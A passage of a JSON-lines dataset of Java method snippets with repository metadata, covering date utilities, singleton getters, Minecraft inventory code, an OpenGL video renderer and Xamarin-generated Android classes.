"https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getCurrentHHmm", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getCurrentHHmm(){    \tString endTime = null;    \ttry{    \t\tSimpleDateFormat format = new SimpleDateFormat(HH_MM);    \t\tCalendar calendar = Calendar.getInstance();    \t\tendTime = format.format(calendar.getTime());    \t}catch(Exception e){    \t}    \treturn endTime;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getAfterHoursTime", "params": ["int", "Date"], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getAfterHoursTime(int hours, Date date){    \tString endTime = null;    \ttry{    \t\tSimpleDateFormat format = new SimpleDateFormat(YYYY_MM_DD_HH_MM);    \t\tCalendar calendar = Calendar.getInstance();    \t\tif(date != null){        \t\tcalendar.setTime(date);    \t\t}    \t\tcalendar.add(Calendar.HOUR, hours);    \t\tendTime = format.format(calendar.getTime());    \t}catch(Exception e){    \t}    \treturn endTime;    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getYestodayYMD", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "String", "snippet": "    public static String getYestodayYMD(){\t\tfinal SimpleDateFormat df = new SimpleDateFormat(YYYY_MM_DD);\t\treturn df.format(new Date(System.currentTimeMillis()-86400000L));\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getDayOfWeek", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "    public static int getDayOfWeek(){    \tCalendar cal = Calendar.getInstance();        cal.setTime(new Date(System.currentTimeMillis()));        return cal.get(Calendar.DAY_OF_WEEK);    }", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "checkformatYMD", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "\tpublic static boolean checkformatYMD(String date){\t\tPattern pattern = Pattern.compile(\"^(19|20)\\\\d{2}-(0[1-9]|1[0-2])-(0[1-9]|[1-2][0-9]|3[0-1])$\");\t\treturn pattern.matcher(date).matches();\t}", "url": "https://raw.githubusercontent.com/xhigher/xtomcat-http-server/master/src/main/java/com/cheercent/xtomcat/httpserver/util/CommonUtils.java", "stars": "2", "class": {"name": "CommonUtils", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getHallService", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "HallService", "snippet": "    public static HallService getHallService() {        if (hallService == null) {            synchronized (HallService.class) {                if (hallService == null) {                    hallService = new HallServiceImpl();                }            }        }        return hallService;    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/dieline/Singleton.java", "stars": "1", "class": {"name": "Singleton", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getSdkUserService", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "SdkUserService", "snippet": "    public static SdkUserService getSdkUserService() {        if (sdkUserService == null) {            synchronized (HallService.class) {                if (sdkUserService == null) {                    sdkUserService = new SdkUserServiceImpl();                }            }        }        return sdkUserService;    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/dieline/Singleton.java", "stars": "1", "class": {"name": "Singleton", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getNetMessageHead", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "NetMessageHead", "snippet": "    public static NetMessageHead getNetMessageHead() {        if (netMessageHead == null) {            synchronized (NetMessageHead.class) {                if (netMessageHead == null) {                    netMessageHead = new NetMessageHead();                }            }        }        return netMessageHead;    }", "url": "https://raw.githubusercontent.com/wangxingman/my_project/master/netty_game_app/netty_game_server/src/main/java/com/game/core/dieline/Singleton.java", "stars": "1", "class": {"name": "Singleton", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "canInteractWith", "params": ["EntityPlayer"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean canInteractWith(EntityPlayer playerIn) {        return playerIn.getHeldItemMainhand() == inv.matrix || playerIn.getHeldItemOffhand() == inv.matrix;    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Item/ItemMatrix/ContainerMatrix.java", "stars": "2", "class": {"name": "ContainerMatrix", "extends": "Container", "implements": null, "modifiers": ["public"]}}, {"method_name": "transferStackInSlot", "params": ["EntityPlayer", "int"], "throws": null, "modifiers": ["public"], "return_type": "ItemStack", "snippet": "    public ItemStack transferStackInSlot(EntityPlayer playerIn, int index) {        ItemStack itemstack = ItemStack.EMPTY;        Slot slot = inventorySlots.get(index);        if (slot != null && slot.getHasStack()) {            ItemStack stack1 = slot.getStack();            itemstack = stack1.copy();            int matrixStart = 0;            int matrixEnd = inv.getSlots();            int invEnd = matrixEnd + 36;            if (index < matrixEnd) {                if (!mergeItemStack(stack1, matrixEnd, invEnd, true))                    return ItemStack.EMPTY;            } else {                if (!itemstack.isEmpty() && !mergeItemStack(stack1, matrixStart, matrixEnd, false))                    return ItemStack.EMPTY;            }            if (stack1.isEmpty())                slot.putStack(ItemStack.EMPTY);            else slot.onSlotChanged();            if (stack1.getCount() == itemstack.getCount())                return ItemStack.EMPTY;            slot.onTake(playerIn, stack1);        }        return itemstack;    }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Item/ItemMatrix/ContainerMatrix.java", "stars": "2", "class": {"name": "ContainerMatrix", "extends": "Container", "implements": null, "modifiers": ["public"]}}, {"method_name": "canTakeStack", "params": ["EntityPlayer"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean canTakeStack(EntityPlayer playerIn) {            return false;        }", "url": "https://raw.githubusercontent.com/Prunoideae/PhasePotion/master/src/main/java/com/naive/phase/Item/ItemMatrix/ContainerMatrix.java", "stars": "2", "class": {"name": "SlotUnmodifiable", "extends": "SlotItemHandler", "implements": null, "modifiers": ["private", "static"]}}, {"method_name": "visit", "params": ["Mural"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void visit(Mural mural) {        System.out.println(\"\u5916\u56fd\u6e38\u5ba2\u53c2\u89c2\u4e86\" + mural.getName());    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/visitor/ForeignVisitor.java", "stars": "2", "class": {"name": "ForeignVisitor", "extends": null, "implements": ["Visitor"], "modifiers": ["public"]}}, {"method_name": "visit", "params": ["JadeArticle"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void visit(JadeArticle jadeArticle) {        System.out.println(\"\u5916\u56fd\u6e38\u6ca1\u6709\u53c2\u89c2\" + jadeArticle.getName());    }", "url": "https://raw.githubusercontent.com/wangIQD/GoF23/master/GOF23/DesignPattern/src/com/wz/behavioral/visitor/ForeignVisitor.java", "stars": "2", "class": {"name": "ForeignVisitor", "extends": null, "implements": ["Visitor"], "modifiers": ["public"]}}, {"method_name": "onDrawFrame", "params": ["GL10"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onDrawFrame(GL10 glUnused) {        synchronized (this) {            if (mUpdateSurface) {                mSurface.updateTexImage();                mSurface.getTransformMatrix(mSTMatrix);                mUpdateSurface = false;            }        }        initDrawFrame();        bindDrawFrameTexture();        initPointerAndDraw();        takeBitmap(glUnused);        GLES20.glFinish();    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/glrender/GSYVideoGLViewSimpleRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewSimpleRender", "extends": "GSYVideoGLViewBaseRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "onSurfaceChanged", "params": ["GL10", "int", "int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSurfaceChanged(GL10 glUnused, int width, int height) {        GLES20.glViewport(0, 0, width, height);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/glrender/GSYVideoGLViewSimpleRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewSimpleRender", "extends": "GSYVideoGLViewBaseRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "onSurfaceCreated", "params": ["GL10", "EGLConfig"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onSurfaceCreated(GL10 glUnused, EGLConfig config) {        mProgram = createProgram(getVertexShader(), getFragmentShader());        if (mProgram == 0) {            return;        }        maPositionHandle = GLES20                .glGetAttribLocation(mProgram, \"aPosition\");        checkGlError(\"glGetAttribLocation aPosition\");        if (maPositionHandle == -1) {            throw new RuntimeException(                    \"Could not get attrib location for aPosition\");        }        maTextureHandle = GLES20.glGetAttribLocation(mProgram,                \"aTextureCoord\");        checkGlError(\"glGetAttribLocation aTextureCoord\");        if (maTextureHandle == -1) {            throw new RuntimeException(                    \"Could not get attrib location for aTextureCoord\");        }        muMVPMatrixHandle = GLES20.glGetUniformLocation(mProgram,                \"uMVPMatrix\");        checkGlError(\"glGetUniformLocation uMVPMatrix\");        if (muMVPMatrixHandle == -1) {            throw new RuntimeException(                    \"Could not get attrib location for uMVPMatrix\");        }        muSTMatrixHandle = GLES20.glGetUniformLocation(mProgram,                \"uSTMatrix\");        checkGlError(\"glGetUniformLocation uSTMatrix\");        if (muSTMatrixHandle == -1) {            throw new RuntimeException(                    \"Could not get attrib location for uSTMatrix\");        }        GLES20.glGenTextures(2, mTextureID, 0);        GLES20.glBindTexture(GL_TEXTURE_EXTERNAL_OES, mTextureID[0]);        checkGlError(\"glBindTexture mTextureID\");        GLES20.glTexParameteri(GLES20.GL_TEXTURE_2D,                GLES20.GL_TEXTURE_MIN_FILTER, GLES20.GL_LINEAR);        GLES20.glTexParameteri(GLES20.GL_TEXTURE_2D,                GLES20.GL_TEXTURE_MAG_FILTER, GLES20.GL_LINEAR);        GLES20.glTexParameteri(GLES20.GL_TEXTURE_2D,                GLES20.GL_TEXTURE_WRAP_S, GLES20.GL_CLAMP_TO_EDGE);        GLES20.glTexParameteri(GLES20.GL_TEXTURE_2D,                GLES20.GL_TEXTURE_WRAP_T, GLES20.GL_CLAMP_TO_EDGE);        mSurface = new SurfaceTexture(mTextureID[0]);        mSurface.setOnFrameAvailableListener(this);        Surface surface = new Surface(mSurface);        sendSurfaceForPlayer(surface);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/glrender/GSYVideoGLViewSimpleRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewSimpleRender", "extends": "GSYVideoGLViewBaseRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "onFrameAvailable", "params": ["SurfaceTexture"], "throws": null, "modifiers": ["synchronized", "public"], "return_type": "void", "snippet": "    synchronized public void onFrameAvailable(SurfaceTexture surface) {        mUpdateSurface = true;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/glrender/GSYVideoGLViewSimpleRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewSimpleRender", "extends": "GSYVideoGLViewBaseRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "releaseAll", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void releaseAll() {    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/glrender/GSYVideoGLViewSimpleRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewSimpleRender", "extends": "GSYVideoGLViewBaseRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "setEffect", "params": ["GSYVideoGLView"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setEffect(GSYVideoGLView.ShaderInterface shaderEffect) {        if (shaderEffect != null) {            mEffect = shaderEffect;        }        mChangeProgram = true;        mChangeProgramSupportError = true;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/glrender/GSYVideoGLViewSimpleRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewSimpleRender", "extends": "GSYVideoGLViewBaseRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "getEffect", "params": [], "throws": null, "modifiers": ["public"], "return_type": "GSYVideoGLView", "snippet": "    public GSYVideoGLView.ShaderInterface getEffect() {        return mEffect;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/glrender/GSYVideoGLViewSimpleRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewSimpleRender", "extends": "GSYVideoGLViewBaseRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "initDrawFrame", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void initDrawFrame() {        if (mChangeProgram) {            mProgram = createProgram(getVertexShader(), getFragmentShader());            mChangeProgram = false;        }        GLES20.glClearColor(0.0f, 0.0f, 0.0f, 1.0f);        GLES20.glClear(GLES20.GL_DEPTH_BUFFER_BIT                | GLES20.GL_COLOR_BUFFER_BIT);        GLES20.glUseProgram(mProgram);        checkGlError(\"glUseProgram\");    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/glrender/GSYVideoGLViewSimpleRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewSimpleRender", "extends": "GSYVideoGLViewBaseRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "bindDrawFrameTexture", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void bindDrawFrameTexture() {        GLES20.glActiveTexture(GLES20.GL_TEXTURE0);        GLES20.glBindTexture(GL_TEXTURE_EXTERNAL_OES, mTextureID[0]);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/glrender/GSYVideoGLViewSimpleRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewSimpleRender", "extends": "GSYVideoGLViewBaseRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "takeBitmap", "params": ["GL10"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void takeBitmap(GL10 glUnused) {        if (mTakeShotPic) {            mTakeShotPic = false;            if (mGSYVideoShotListener != null) {                Bitmap bitmap = createBitmapFromGLSurface(0, 0, mSurfaceView.getWidth(), mSurfaceView.getHeight(), glUnused);                mGSYVideoShotListener.getBitmap(bitmap);            }        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/glrender/GSYVideoGLViewSimpleRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewSimpleRender", "extends": "GSYVideoGLViewBaseRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "initPointerAndDraw", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void initPointerAndDraw() {        mTriangleVertices.position(TRIANGLE_VERTICES_DATA_POS_OFFSET);        GLES20.glVertexAttribPointer(maPositionHandle, 3, GLES20.GL_FLOAT,                false, TRIANGLE_VERTICES_DATA_STRIDE_BYTES,                mTriangleVertices);        checkGlError(\"glVertexAttribPointer maPosition\");        GLES20.glEnableVertexAttribArray(maPositionHandle);        checkGlError(\"glEnableVertexAttribArray maPositionHandle\");        mTriangleVertices.position(TRIANGLE_VERTICES_DATA_UV_OFFSET);        GLES20.glVertexAttribPointer(maTextureHandle, 3, GLES20.GL_FLOAT,                false, TRIANGLE_VERTICES_DATA_STRIDE_BYTES,                mTriangleVertices);        checkGlError(\"glVertexAttribPointer maTextureHandle\");        GLES20.glEnableVertexAttribArray(maTextureHandle);        checkGlError(\"glEnableVertexAttribArray maTextureHandle\");        GLES20.glUniformMatrix4fv(muMVPMatrixHandle, 1, false, mMVPMatrix,                0);        GLES20.glUniformMatrix4fv(muSTMatrixHandle, 1, false, mSTMatrix, 0);        GLES20.glDrawArrays(GLES20.GL_TRIANGLE_STRIP, 0, 4);        checkGlError(\"glDrawArrays\");    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/glrender/GSYVideoGLViewSimpleRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewSimpleRender", "extends": "GSYVideoGLViewBaseRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "getProgram", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getProgram() {        return mProgram;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/glrender/GSYVideoGLViewSimpleRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewSimpleRender", "extends": "GSYVideoGLViewBaseRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "getMuMVPMatrixHandle", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getMuMVPMatrixHandle() {        return muMVPMatrixHandle;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/glrender/GSYVideoGLViewSimpleRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewSimpleRender", "extends": "GSYVideoGLViewBaseRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "getMuSTMatrixHandle", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getMuSTMatrixHandle() {        return muSTMatrixHandle;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/glrender/GSYVideoGLViewSimpleRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewSimpleRender", "extends": "GSYVideoGLViewBaseRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "getMaPositionHandle", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getMaPositionHandle() {        return maPositionHandle;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/glrender/GSYVideoGLViewSimpleRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewSimpleRender", "extends": "GSYVideoGLViewBaseRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "getMaTextureHandle", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int getMaTextureHandle() {        return maTextureHandle;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/glrender/GSYVideoGLViewSimpleRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewSimpleRender", "extends": "GSYVideoGLViewBaseRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "getSTMatrix", "params": [], "throws": null, "modifiers": ["public"], "return_type": "float", "snippet": "    public float[] getSTMatrix() {        return mSTMatrix;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/glrender/GSYVideoGLViewSimpleRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewSimpleRender", "extends": "GSYVideoGLViewBaseRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "getTextureID", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "    public int[] getTextureID() {        return mTextureID;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/glrender/GSYVideoGLViewSimpleRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewSimpleRender", "extends": "GSYVideoGLViewBaseRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "getVertexShader", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "    protected String getVertexShader() {        return mVertexShader;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/glrender/GSYVideoGLViewSimpleRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewSimpleRender", "extends": "GSYVideoGLViewBaseRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "getFragmentShader", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "String", "snippet": "    protected String getFragmentShader() {        return mEffect.getShader(mSurfaceView);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/glrender/GSYVideoGLViewSimpleRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewSimpleRender", "extends": "GSYVideoGLViewBaseRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "takeShotPic", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void takeShotPic() {        mTakeShotPic = true;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/glrender/GSYVideoGLViewSimpleRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewSimpleRender", "extends": "GSYVideoGLViewBaseRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "setGSYVideoShotListener", "params": ["GSYVideoShotListener", "boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setGSYVideoShotListener(GSYVideoShotListener listener, boolean high) {        this.mGSYVideoShotListener = listener;        this.mHighShot = high;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/render/glrender/GSYVideoGLViewSimpleRender.java", "stars": "2", "class": {"name": "GSYVideoGLViewSimpleRender", "extends": "GSYVideoGLViewBaseRender", "implements": null, "modifiers": ["public"]}}, {"method_name": "load", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void load() {        super.load();        include(\"a\", \"\\u1D00\");        include(\"b\", \"\\u0299\");        include(\"c\", \"\\u1D04\");        include(\"d\", \"\\u1D05\");        include(\"e\", \"\\u1D07\");        include(\"f\", \"\\u0493\");        include(\"g\", \"\\u0262\");        include(\"h\", \"\\u029C\");        include(\"i\", \"\\u026A\");        include(\"j\", \"\\u1D0A\");        include(\"k\", \"\\u1D0B\");        include(\"l\", \"\\u029F\");        include(\"m\", \"\\u1D0D\");        include(\"n\", \"\\u0274\");        include(\"o\", \"\\u1D0F\");        include(\"p\", \"\\u1D18\");        include(\"q\", \"\\u01EB\");        include(\"r\", \"\\u0280\");        include(\"s\", \"\\uA731\");        include(\"t\", \"\\u1D1B\");        include(\"u\", \"\\u1D1C\");        include(\"v\", \"\\u1D20\");        include(\"w\", \"\\u1D21\");        include(\"x\", \"\\u0078\");        include(\"y\", \"\\u028F\");        include(\"z\", \"\\u1D22\");        include(\"|\", \"\\u23D0\");        include(\"-\", \"\\u2013\");        include(\"!\", \"\\uFF01\");        include(\"?\", \"\\uFF1F\");    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/smalltext/SmallTextManager.java", "stars": "12", "class": {"name": "SmallTextManager", "extends": "HashMapManager", "implements": null, "modifiers": ["public"]}}, {"method_name": "getUnicodeFromString", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getUnicodeFromString(String text) {        return getRegistry().get(text.toLowerCase());    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/smalltext/SmallTextManager.java", "stars": "12", "class": {"name": "SmallTextManager", "extends": "HashMapManager", "implements": null, "modifiers": ["public"]}}, {"method_name": "convert", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String convert(String text) {        String converted = text;        for(char c : converted.toLowerCase().toCharArray()) {            String character = String.valueOf(c);            converted = StringUtils.replaceIgnoreCase(converted, character, getUnicodeFromString(character));        }        return converted;    }", "url": "https://raw.githubusercontent.com/Crystallinqq/Mercury-Client/master/src/main/java/fail/mercury/client/api/smalltext/SmallTextManager.java", "stars": "12", "class": {"name": "SmallTextManager", "extends": "HashMapManager", "implements": null, "modifiers": ["public"]}}, {"method_name": "registerApplications", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "\tpublic static void registerApplications ()\t{\t\t\t\t// Application and Instrumentation ACWs must be registered first.\t\t\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/mono/android/app/ApplicationRegistration.java", "stars": "2", "class": {"name": "ApplicationRegistration", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "monodroidAddReference", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\t{\t\tif (refList == null)\t\t\trefList = new java.util.ArrayList ();\t\trefList.add (obj);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/CellRenderer_RendererHolder.java", "stars": "2", "class": {"name": "CellRenderer_RendererHolder", "extends": "java", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "monodroidClearReferences", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\t{\t\tif (refList != null)\t\t\trefList.clear ();\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/CellRenderer_RendererHolder.java", "stars": "2", "class": {"name": "CellRenderer_RendererHolder", "extends": "java", "implements": ["mono"], "modifiers": ["public"]}}, {"method_name": "main", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {        //\u4f7f\u7528\u6570\u7ec4\u5b58\u50a8\u591a\u4e2aPerson\u5bf9\u8c61        Person[] arr = {                new Person(\"\u67f3\u5ca9\",38),                new Person(\"\u8fea\u4e3d\u70ed\u5df4\",18),                new Person(\"\u53e4\u529b\u5a1c\u624e\",19)        };        //\u5bf9\u6570\u7ec4\u4e2d\u7684Person\u5bf9\u8c61\u4f7f\u7528Arrays\u7684sort\u65b9\u6cd5\u901a\u8fc7\u5e74\u9f84\u8fdb\u884c\u5347\u5e8f(\u524d\u8fb9-\u540e\u8fb9)\u6392\u5e8f        /*Arrays.sort(arr, new Comparator<Person>() {            @Override            public int compare(Person o1, Person o2) {                return o1.getAge()-o2.getAge();            }        });*/        //\u4f7f\u7528Lambda\u8868\u8fbe\u5f0f,\u7b80\u5316\u533f\u540d\u5185\u90e8\u7c7b        Arrays.sort(arr,(Person o1, Person o2)->{            return o1.getAge()-o2.getAge();        });        //\u4f18\u5316\u7701\u7565Lambda        Arrays.sort(arr,(o1, o2)->o1.getAge()-o2.getAge());        //\u904d\u5386\u6570\u7ec4        for (Person p : arr) {            System.out.println(p);        }    }", "url": "https://raw.githubusercontent.com/liuminchao123/JavaWeb_Learning/master/02.%20java/Java/%E9%BB%91%E9%A9%AC%E6%95%99%E7%A8%8B/18.%E3%80%90%E7%BA%BF%E7%A8%8B%E6%B1%A0%E3%80%81Lambda%E8%A1%A8%E8%BE%BE%E5%BC%8F%E3%80%91-%E7%AC%94%E8%AE%B0/code/07_ThreadAndLambda/src/com/itheima/demo05/Lambda/Demo01Arrays.java", "stars": "2", "class": {"name": "Demo01Arrays", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "onClick", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void onClick (android.view.View p0)\t{\t\tn_onClick (p0);\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/ButtonRenderer_ButtonClickListener.java", "stars": "2", "class": {"name": "ButtonRenderer_ButtonClickListener", "extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"method_name": "n_onClick", "params": ["android"], "throws": null, "modifiers": ["native", "private"], "return_type": "void", "snippet": "\tprivate native void n_onClick (android.view.View p0);\tprivate java.util.ArrayList refList;\tpublic void 